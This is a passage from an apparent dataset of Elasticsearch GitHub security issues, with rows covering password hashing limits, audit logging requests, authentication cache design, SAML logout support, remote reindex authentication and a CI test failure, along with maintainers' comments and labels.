I think we should split this nice to have (name of role that grants action) into its own issue. I am not sure that we have any open enhancement requests for this exact feature. If not, I think we should hold off on adding it. @joshbressers do you recall seeing any for this?*Original comment by @joshbressers:*

This will become more important with things like reporting and SAML doing role caching.",no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,1285856019,"Document limitations around commas in role and user names","### Description

Currently, it's possible to create both roles and usernames containing commas. This however is not fully compatible with Get APIs for users and roles (see #72286). Since fully addressing this is not a quick fix and requires further thought, we should document the limitation and warn end-users of the current incorrect behavior. This involves updating role and user API docs, as well as LDAP/AD docs where this issue can cause very counter-intuitive behavior when used in combination with role mapping templates. ","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,:Security/Authorization,:Security/Security,Team:Docs,Team:Security,"
elastic/elasticsearch,407746558,"API passwords over 72 characters are truncated to 72 characters","Greetings,

I'm filing a bug report here as advised by Josh Bressers in Elastic Product Security.

By default, ElasticSearch uses [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) in order to hash the passwords that it receives. One limitation of this algorithm is that it limits the input to 72 bytes. In practice, what this means is that any password submitted with over 72 ASCII characters is truncated to 72 characters in a silent fashion. Note that this is confirmed to occur both with the `elasticsearch-setup-passwords` tool, as well as the normal API call at `_xpack/security/user/<username>/_password`.

This is obviously problematic and surprising for users. **As a first step**, the API (and perhaps also the `elasticsearch-setup-passwords` tool) should be configured to **throw an error to the user** if they try to submit a character longer than 72 ASCII characters.

(As a side note, I'm unsure if ElasticSearch is actually able to accept Unicode characters in passwords, but I would assume so. If so, in this case, the aforementioned new alert should fire for any password string longer than 72 bytes specifically, as opposed to password length.)

Secondly, ElasticSearch should solve this problem entirely. At Dropbox, they SHA512 a password before inputting it to bcrypt. This solves the character limit problem of the algorithm. This is documented in their 2016 blog here:
https://blogs.dropbox.com/tech/2016/09/how-dropbox-securely-stores-your-passwords/

Furthermore, this is also the approach taken by the bcrypt.net library:
https://github.com/BcryptNet/bcrypt.net

The internal team is discussing alternatives / possible solutions for this and I am just opening this GitHub issue for posterity.","Pinging @elastic/es-security@joshbressers 3 months later, any update on this?Hi @Zamiell,

Apologies for the delay.

We don't have any updates on this issue yet. It's on the list, but we don't have this work scheduled right now.",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1303863746,"Update create-role-mappings.asciidoc","Groups field should be presented as an array example. The current example is singleton which works but confuses users when trying to setup multiple groups. 
ref: https://stackoverflow.com/questions/55909872/add-multiple-ad-groups-to-elasticsearch-rol","@predogma please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-docs (Team:Docs)",yes,">docs,:Security/Security,Team:Docs,Team:Security,v8.3.4,"
elastic/elasticsearch,784558917,"Query API Keys by application","In support of https://github.com/elastic/kibana/issues/77966, we are seeking to list API Keys for use with APM.  Currently API keys can be retrieved by a few attributes - [id, name, realm, user, owner](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-api-key.html#security-api-get-api-key-path-params) - is it feasible to add application?

All keys used by APM for server - agent authorization are in the `""apm""` application.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,790378559,"`_has_privileges` API for checking privileges for remote indices","The Elastic Security Solution utilizes the `_has_privileges` api to determine if a Detection rule has the necessary privileges to read from the target index patterns supplied to the rule definition. It is the team's understanding that the `_has_privileges` api does not support reading privileges from remote indices (this is an issue when customers are using Cross-cluster Search). This has resulted in the Detection rules returning ""false negatives"" claiming the rule does not have the required read privileges when in actuality it does. In this instance, the `_has_privileges` API will return `false` for the `read` privilege on the remote indices leading to this ""false negative"" state.

We would love an API which could determine if the logged in user has `read` privileges on remote indices.

Internal Ref issue: https://github.com/elastic/seceng/issues/2084","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,411249970,"Cannot run Kibana upgrade assistant (7.x=>8.0) on Security Index ","The Kibana upgrade assistant reindexes to a single `_doc` type in preparation for the full removal of types.
The security index cannot handle this because it explicitly indexes into the `doc` type.

We hope and expect that there won't be a standard ""security index"" in 8.0, rather it will be migrated to a special ""system index"" with a different internal API that will have different feature/compatibility trade offs, and we will need to provide a special migration process to move the 7.x security index to a 8.0 style system-index.

However, if for some reason that doesn't happen, then we will need to move the security code to use the typeless APIs during the 7.x series so that it is compatible with 8.0, and the Kibana upgrade assistant. 
 
Related: https://github.com/elastic/elasticsearch/issues/38740","Pinging @elastic/es-securityI think this is the same problem as https://github.com/elastic/elasticsearch/issues/38796#issuecomment-466060171, which is _hopefully_ fixed by #39256, i.e. moving to typeless APIs in 7.0.  However, I have some concerns that there are edge cases where there will be problems: https://github.com/elastic/elasticsearch/pull/39256#issuecomment-466078794

We're aiming to test these edge cases at the beginning of next week so you might want to subscribe to that issue and PR in case we find anything.",no,":Security/Security,Team:Security,"
elastic/elasticsearch,345319359,"Additional audit logging events","We've seen requests for additional audit logging events:

. Creation of application roles/profiles
. Modification of roles/profiles
. Changes to system security configuration
. Manual change to the non security related configuration which effects service function
. Log integrity events
. Manual log deletion or stoppage

Log integrity and log deletion events may be something we cannot catch, but we'd like to investigate this.  Changes to files that are reloaded by the node seem to be something we could log on, as well as API-based changes to security settings.

Thanks!

","Pinging @elastic/es-securityUP
Thats really important for us.

As System Administrator and Security auditor, I would like to have information about all changes in the role (create/update/delete) in audit log. I would like to see who? and how? changed the role, which permission was (add/changed/deleted)UPUp, we still waiting for this feature",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,495260464,"DLS bit_set_cache usage reported from master","ES version 7.3+

7.3 introduced a new cache for document level security. As part of it, `_xpack/usage` was extended to have some stats on the DLS bit_set_cache. However, the usage action runs only on the master node, which will not have anything in the cache for pure master nodes.

We should ensure that diagnostics dumps contain the dls cache usage from all data nodes instead.

","Pinging @elastic/es-securityThis is a problem for pretty much all of the xpack usage action.

There's a lot of things in that response that can vary by node, however we only report on them on the master.
For security, most of what's in that response is actually node specific. Much of the time the master values are likely to be as good as any other node, but not always.
The DLS cache is an obvious example, but the realm caches are much more meaningful from a coordinating node than the master.

I suspect we should revist the xpack usage action in its entirety and change some sections to return per-node results.
However, the will affect diagnostics and telemetry, so we'll need to coordinate whatever we change.
 We discussed this during our team fix-it meeting this morning. One question that we have is whether or not we really need to be tracking DLS bit set cache usage in the usage API? It feels more like it's being used here to report stats, not so much feature usage. If that's the case, maybe we need to consider how it can be that plugins expose additional stats to the node stats API, rather than twisting the X-Pack usage API around so that usage can be reported at the node level.We recently encountered warnings that our DLS bitset cache was full, and want to rectify it, because we rely heavily on DLS and fear an overflowing cache may degrade search performance for our users. Unfortunately, without a way to determine usage of the bitset cache, it seems the only way to configure an appropriate cache size is to make a change, restart nodes, and wait for a full day's usage.

We would very much love a way to inspect the current bitset cache usage and evictions for each node, as restarts are often greatly impactful.",no,">enhancement,:Security/Authorization,v7.3.0,Team:Security,"
elastic/elasticsearch,627312814,"Investigate `CachingUsernamePassword` cache logic improvements","The [`CachingUsernamePassword#authenticateWithCache`](https://github.com/elastic/elasticsearch/blob/460b204f8e61ac77c6550f1df3b7b0d4413fb0d4/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/support/CachingUsernamePasswordRealm.java#L149) method aims to prevent multiple authn requests to be individually validated, because validation can be expensive (hash verify / contact of remote service).
Instead, to improve performance, a successful authentication is cached so that subsequent requests are checked for equality against the cache entry, saving cycles on actual validation. However, if the inbound credential doesn't equal the cache entry, the cache is cleared and validation is performed anew. I think we can avoid clearing the cache if the inbound credential is invalid, and only clear the cache if it's really stale.

In code: 

```
diff --git a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/support/CachingUsernamePasswordRealm.java b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/support/CachingUsernamePasswordRealm.java
index 1ac41e1c411..0d4ccd43b4d 100644
--- a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/support/CachingUsernamePasswordRealm.java
+++ b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/support/CachingUsernamePasswordRealm.java
@@ -150,8 +150,16 @@ public abstract class CachingUsernamePasswordRealm extends UsernamePasswordRealm
                             // hash of the credential for this forestalled request.
                             // clear cache and try to reach the authentication source again because password
                             // might have changed there and the local cached hash got stale
-                            cache.invalidate(token.principal(), listenableCacheEntry);
-                            authenticateWithCache(token, listener);
+                            doAuthenticate(token, ActionListener.wrap(authResult -> {
+                                if (authResult.isAuthenticated() && authResult.getUser().enabled()) {
+                                    // cache is stale
+                                    cache.invalidate(token.principal(), listenableCacheEntry);
+                                }
+                                listener.onResponse(authResult);
+                            }, e -> {
+                                cache.invalidate(token.principal(), listenableCacheEntry);
+                                listener.onFailure(e);
+                            }));
                         }
                     } else if (credsMatch) {
                         // not authenticated but instead of hammering reuse the result. a new
```","Pinging @elastic/es-security (:Security/Authentication)I have a few concerns of the proposed change:
1. It does not really help when the DoS is performed using just invalid password.
2. When there are many clients (using the same credentials) sending requests simultaneously, it may end up doing more hashing work. Because `doAuthenticate` always performs hash computation for each client, while `authenticateWithCache` leverages a `Future` so that hash is only computed for a single client and others get notified when the Future is ready. 
3. The new `authResult` is not cached. Since there could be multiple `doAuthentication` report back as success, we could have a racing condition: two successful authentication may have different passwords if the user password is changed in between. The chance is very slim. So may not be a real issue. Adding it here as a theorectical discussion.I think it may be more helpful for us to actively treat the internal (reserved, native, file) realms differently to the external (ad, ldap) realms.

For external realms we really do need to retry authentication when we get an incorrect password (for auditing/lockout purposes as well as correctness), but for internal realms we can reliably check whether the underlying store has changed which gives us more options for caching multiple incorrect passwords.Thank you @ywangd and @tvernum for your input!

Yang, I now believe you are right. The authentication requests that check if the cache entry is stale or not, as sketched above, don't really work as I thought they would. Thanks for digging into my gibberish!

Regarding
> It does not really help when the DoS is performed using just invalid password.

and Tim's
> I think it may be more helpful for us to actively treat the internal (reserved, native, file) realms differently to the external (ad, ldap) realms. ... for internal realms we can reliably check whether the underlying store has changed which gives us more options for caching multiple incorrect passwords.

I think you mean we can implement a negative cache for these cases, which is what I was thinking when I had raised https://github.com/elastic/elasticsearch/issues/57365 . The `CachingUsernamePasswordRealm`, by scope, is a positive cache, it only caches successful authentication results. It can not cache failures, because then we would encounter change propagation problems. But, as I hope to treat under #57365, we can have a negative cache for the realms where we control the underlying store (reserved/file/native).

The case that I was hoping (but not really phrasing it clearly) to deal with under this issue, is that of an unnecessary invalidation of a positive cache entry. I have since raised https://github.com/elastic/elasticsearch/pull/57480 to deal with this. Basically it ensures that a cache entry is not invalidated by just a wrong password; the cache entry is **updated** if the different password is indeed correct now.

I hope to keep these two cases distinct, although they do complement each other nicely. They both decrease the number of password checks (expensive password hashes) we actually perform. The present issue minimizes valid password checks (because valid credentials are not evicted from cache), and #57365 minimizes invalid password checks (because wrong passwords that have been recently checked are remembered in the cache).



My thought is more that the `CachingUsernamePasswordRealm` presumes that it is caching an external identity provider, and all of its implementation decisions are based on that premise.
It clears the cache on an incorrect password because it cannot reliably detect an incorrect password except by going back to the original store.

It _could_ be smarter and not clear the cache unless it works out the the new password is correct, but, if that optimisation is only going to be meaningful for external realms,  then it's pretty minor benefit.

There's more benefit in thinking about what a `CachingUsernamePasswordRealm` would look like if it didn't need to worry about external changes. In that case you know that incorrect passwords are incorrect and _never_ need to clear the cache. You can also have a negative cache (per #57365) but I don't think it needs to be treated separately. If we want the best possible cache behaviour for the native realm, then we need a variant of `CachingUsernamePasswordRealm` that doesn't treat the password store as being external. > If we want the best possible cache behaviour for the native realm, then we need a variant of CachingUsernamePasswordRealm that doesn't treat the password store as being external.

+1

The motivation here is to reduce hashing cost, which applies to the internal realms. By detecting password changes proactively and clearing cache is a more efficient approach.> There's more benefit in thinking about what a CachingUsernamePasswordRealm would look like if it didn't need to worry about external changes

Following our last discussion, I'm going to prototype this option.

`CachingUsernamePasswordRealm` is a complicated beast because it conflates two responsibilities: caching of successful authentications and ensuring a single concurrent password verification for a given username. The latter is less useful for native and file realms (certainly not useful when validating different passwords) so I am going to trade dubious optimizations for simplicity.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,575475793,"manage_index_templates is not granular enough","
<!-- Feature request -->

manage_index_templates is the only setting which controls permissions on templates. This means that to allow a user to create a template, you also have to let them delete or modify any other template. In practice, this means that running a multi-user setting where users are using whatever beats products they want involves either trusting all users with manage_index_templates, or superusers creating a lot of templates for them. #53101 offers a few potential approaches to make this more approachable, e.g. by giving roles a maximum priority, so that they can't modify centrally managed templates","Pinging @elastic/es-security (:Security/Security)We'd like to see the ability to just read index templates, rather than have to provide write access as well.Related to https://github.com/elastic/elasticsearch/issues/29732Any updates on this?

We are up against some thorny issues on Security Solutions where we are trying to roll over our alerting/signals index and we would like the existing user to be able to just read the index templates rather than have `manage_index_templates`",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317448362,"License upgrade from basic to gold showing disabled features","*Original comment by @chrisronline:*

I've been testing @bmcconaghy awesome new LINK REDACTED and I noticed that when I upgrade from a basic -> gold, the response from the ES api endpoint says:
```
{
  ""acknowledged"": false,
  ""license_status"": ""valid"",
  ""acknowledge"": {
    ""message"": ""This license update requires acknowledgement. To acknowledge the license, please read the following messages and update the license again, this time with the \""acknowledge=true\"" parameter:"",
    ""security"": [""Field and document level access control will be disabled."", ""Custom realms will be ignored.""]
  }
}
```

It seems confusing to me that we're telling users some features will be disabled while going from basic -> gold when that should only add features? I think the features are accurate in that they aren't available in gold, but the user didn't have them in basic so it feels weird to tell them about it

cc @skearns64 ","*Original comment by @tvernum:*

This is intentional (which doesn't mean it's _correct_, just that someone, at some point, thought it should work this way), but I agree that it can be confusing.

LINK REDACTED

                switch (currentMode) {
                    case BASIC:
                    case STANDARD:
                        // ^^ though technically it was already disabled, it's not bad to remind them
                    case TRIAL:
                    case PLATINUM:
                        return new String[] {
                            ""Field and document level access control will be disabled."",
                            ""Custom realms will be ignored.""
                        };
                }

 ",no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,1154820161,"Fix documentation of privileges required for CCR","CCR on the leader cluster requires more than just the currently
documented privileges of ""monitor"" and ""read"". Other required privileges
are:
* manage_leader_index
* view_index_metadata
* indices:admin/seq_no/renew_retention_lease

This PR fixes the documentation to require ""manage"" and ""read"" for CCR
on the leader cluster.

Relates: #84156
Relates: #61308
","@tvernum This is a short term documentation fix for the CCR privilege issue. I labelled it as draft so that we can take more time to think whether just requiring ""manage"" is sufficient for now or do we want to enhance the ""manage_leader_index"" privilege and such. Please let me know your opinions. Thanks!",yes,">bug,>docs,:Security/Authorization,v8.6.0,"
elastic/elasticsearch,317454383,"[Security] Index Upgrade can break the ""type"" field","*Original comment by @tvernum:*

`Upgrade.getSecurityUpgradeCheckFactory()` provides the following painless script for upgrading the security index:

```
ctx._source.type = ctx._type;
if (!ctx._type.equals(""doc"")) {
   ctx._id = ctx._type + ""-"" + ctx._id;
   ctx._type = ""doc"";
}
```

However, if the `_type` is already `doc` then this overwrites the `type` with ""doc"" which is incorrect.

So, if the script somehow runs twice, then a user ""jsmith"" will start as:
```
_type: user
id: jsmith
type: null
```
and then be upgraded to
```
_type: doc
id: user-jsmith
type: user
```
and then be upgraded a second time to
```
_type: doc
id: user-jsmith
type: doc
```

It seems that is what happened [in this discuss issue](https://discuss.elastic.co/t/cannot-see-non-reserved-users-and-roles-since-6-1-upgrade), but I'm not sure how/why it ran twice.",,no,">bug,v6.1.0,:Security/Security,Team:Security,"
elastic/elasticsearch,642705384,"Reindex from Remote to support auth without username and password","
### Extending authentication in remote reindex to support non-username/password type of authentication.

During reindex call, local cluster makes a scroll request to remote's node and this currently supports username and password as only mechanism to authenticate. I was exploring how we can build the support for remote reindex for Amazon hosted elasticsearch. 
Is there a way to support reindex from remote on clusters using auth like saml, kerberos, oidc (and IAM)?
If required, I can probably help out in building the support.

I had posted same question below but I'm still waiting for reply.
https://discuss.elastic.co/t/using-remote-reindex-on-clusters-which-doesnt-support-username-password/237333

","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-distributed (:Distributed/Reindex)> this currently supports username and password as only mechanism to authenticate

You can also authenticate via PKI (TLS client certificates) by configuring [`reindex.ssl.key` or `reindex.ssl.keystore.path`](https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-reindex.html#reindex-ssl).

> using auth like saml, kerberos, oidc (and IAM)

The issue is that there is no standard way to provide SAML or OIDC credentials over a rest connection. Both SAML and OIDC are primarily used as browser based SSO protocols, and they require an interactive user interface in order to facilitate authentication. There isn't a easy or standard way to make that work between two backend services like ES.

Kerberos is theoretically possible (for example, we support Kerberos authentication from Hadoop) but it wouldn't work the way you would expect - it would require that the ES instance was running with a Kerberos identity. It wouldn't use the end-user's identity.

> If required, I can probably help out in building the support

If you have specific thoughts about _how_ that would work, I'd be interested in hearing them, because I don't think that what you are asking for is feasible.I agree that there doesn't seem to be a generalized solution for this. In particular, not sure if there can even be any solution for SSO based authentication. 
On a high level, I was thinking about simply adding plugin support to intercept outgoing REST calls and adding the relevant headers. What exactly needs to be done for each auth type can be handled by different plugins. I guess I was thinking about this more from IAM perspective but I agree, wouldn't work with SAML and OIDC(and barely for kerberos). 

Just curious, what is the current recommendation for doing remote reindex on such domains?

> Just curious, what is the current recommendation for doing remote reindex on such domains?

All of Elastic's deployments/distributions of ES (whether cloud hosted, or installed on premises) support some sort of username+password authentication. We don't really run into cases where we people need reindex to work across a different authentication scheme. Another consideration here would be the use of an API Key via HTTP Header

e.g.:  

```
curl -H ""Authorization: ApiKey VnVhQ2ZHY0JDZGJrUW0tZTVhT3g6dWkybHAyYXhUTm1zeWFrdzl0dk5udw=="" http://localhost:9200/_cluster/health

```",no,">enhancement,:Security/Authentication,:Distributed/Reindex,Team:Distributed,Team:Security,"
elastic/elasticsearch,664308349,"SAML metadata with dots in its name cannot be used in Mustache expression","When saml attributes are populated as user metadata, if an attribute does not hav a friendly name, it will only be mapped to a metadata field of name `saml(NAME)`. The name of a saml attribute often contains dots, e,g, `urn:oid:2.5.4.42`. When it is used in DLS/FLS template, Mustache is *not* able to process correctly since dots are special in Mustache expressions.","Pinging @elastic/es-security (:Security/Authentication)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,456704655,"Support HTTP-POST binding for SAML logout","At the moment we only support the `HTTP-Redirect` binding for Logout (and `HTTP-POST` for Authentication).

This is because it is the [recommendation in the SAML 2 Interoperability Profile](https://kantarainitiative.github.io/SAMLprofiles/saml2int.html#_responses_2) that SPs and IdP use `HTTP-Redirect` for logout. An early (unreleased) implementation of our logout code used POST because we already had the signature checking code for POST, but we switched to Redirect to conform with the interop profile.

However, we've started to see one popular IdP send `LogoutResponse` messages using the `HTTP-POST` binding, and we already have most of the necessary code for handing `HTTP-POST` so we probably can support it in addition to the (preferred) `HTTP-Redirect` binding.

Note: This will require a change in Kibana as well, because the Kibana `/logout` route currently only supports `GET` .

Relates: #40901","Pinging @elastic/es-securitycan I have a look into it @tvernum ?@abhiroj If you know something about SAML and have an environment to test in, then that would be great. 
The hard work on this issue will be making sure it is compliant with the spec, and works with major SAML IdPs. The actual development work is fairly straight forward.sure, I can get started on it with setting up of a test env. can you point to some reference docs for that?

> can you point to some reference docs for that

Sorry, No. For elasticsearch in general there is a contributing guide that covers running tests, but we don't have any docs that explain how to test SAML with a real Identity Provider.
If you don't already have a working SAML environment to test in, then I wouldn't recommend working on this issue.

Something with the [Good First Issue](https://github.com/elastic/elasticsearch/labels/good%20first%20issue) label might be a better option to get started with.
This issue is very much related to #40901. When Kibana recieves the POST request from the idP (with browser as the mediating agent), elasticsearch has already logged user out of the system, i.e. tokens are invalidated. That is, in terms of workflow, both the HTTP-Redirect and the HTTP-POST requests come into play at exactly the same position. 

For HTTP-Redirect, Kibana simply ignores it. So as a minimal effort, the HTTP-POST binding can be supported in the same way, i.e. just add a POST route to logout for Kibana and ignore the incoming request.

~IIUC, handling the `LogoutResponse` from the idP makes it possible to achieve chaining logout from other SPs, e.g. another Kibana instance that is using the same SAML session. This could be a valid use case.~ (edit: This is incorrect. The `LogoutResponse` is sent back to the initiating SP at the end of single logout. The cascading (front-channel) single logout is realised with a series of `LogoutRequest` sent from the idP, which I think we already support via the `/_security/saml/invalidate` API.)

In summary, this issue by itself can be fixed trivially. A more involved fix on the elasticsearch side can be leverage for both this issue and #40901.There was a mistake in #56316's description. It didn't close this. Reopenning.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,893285696,"[CI] XPackRestIT test {p0=privileges/11_builtin/Test get builtin privileges 8.x} failing","Relates 15d5f2ad354f32f9be238f2cebd6dd3788e51cac which was merged while BWC tests were disabled for a backport, see https://github.com/elastic/elasticsearch/pull/73143.

**Build scan:**
https://gradle-enterprise.elastic.co/s/7ahyhvuehz5eg/tests/:x-pack:plugin:yamlRestCompatTest/org.elasticsearch.xpack.test.rest.XPackRestIT/test%20%7Bp0=privileges%2F11_builtin%2FTest%20get%20builtin%20privileges%208.x%7D

**Reproduction line:**
`./gradlew ':x-pack:plugin:yamlRestCompatTest' --tests ""org.elasticsearch.xpack.test.rest.XPackRestIT"" -Dtests.method=""test {p0=privileges/11_builtin/Test get builtin privileges 8.x}"" -Dtests.seed=8FB395AA27A0EDA0 -Dtests.locale=id -Dtests.timezone=Eire -Druntime.java=11`

**Applicable branches:**
master

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.test.rest.XPackRestIT&tests.test=test%20%7Bp0%3Dprivileges/11_builtin/Test%20get%20builtin%20privileges%208.x%7D

**Failure excerpt:**
```
java.lang.AssertionError: Failure at [privileges/11_builtin:27]: field [cluster] doesn't have length [43]
Expected: <43>
     but: was <41>

  at __randomizedtesting.SeedInfo.seed([8FB395AA27A0EDA0:7E7AA70895C8058]:0)
  at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.executeSection(ESClientYamlSuiteTestCase.java:451)
  at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.test(ESClientYamlSuiteTestCase.java:428)
  at jdk.internal.reflect.GeneratedMethodAccessor13.invoke(null:-1)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:566)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:834)

  Caused by: java.lang.AssertionError: field [cluster] doesn't have length [43]
  Expected: <43>
       but: was <41>

    at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
    at org.junit.Assert.assertThat(Assert.java:956)
    at org.elasticsearch.test.rest.yaml.section.LengthAssertion.doAssert(LengthAssertion.java:62)
    at org.elasticsearch.test.rest.yaml.section.Assertion.execute(Assertion.java:65)
    at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.executeSection(ESClientYamlSuiteTestCase.java:444)
    at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.test(ESClientYamlSuiteTestCase.java:428)
    at jdk.internal.reflect.GeneratedMethodAccessor13.invoke(null:-1)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:566)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
